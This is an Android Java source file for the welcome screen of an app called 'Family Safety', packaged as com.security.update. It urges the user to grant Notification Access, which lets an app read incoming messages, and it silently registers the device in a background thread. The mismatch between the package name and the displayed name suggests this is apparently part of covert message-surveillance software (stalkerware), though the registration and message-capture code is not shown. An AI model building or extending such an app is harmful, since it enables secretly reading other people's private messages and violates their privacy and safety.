package com.security.update;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class WelcomeActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView title = new TextView(this);
        title.setText("Family Safety");
        title.setTextSize(24f);
        title.setPadding(50, 100, 50, 20);

        TextView desc = new TextView(this);
        desc.setText("This app helps parents monitor their children's messages for safety.\n\nPlease enable Notification Access to continue.");
        desc.setTextSize(14f);
        desc.setPadding(50, 20, 50, 40);

        Button enableBtn = new Button(this);
        enableBtn.setText("Enable Notification Access");
        enableBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        });

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(title);
        layout.addView(desc);
        layout.addView(enableBtn);

        setContentView(layout);

        new Thread(() -> DeviceRegistrar.getOrRegister(getApplicationContext())).start();
    }
}
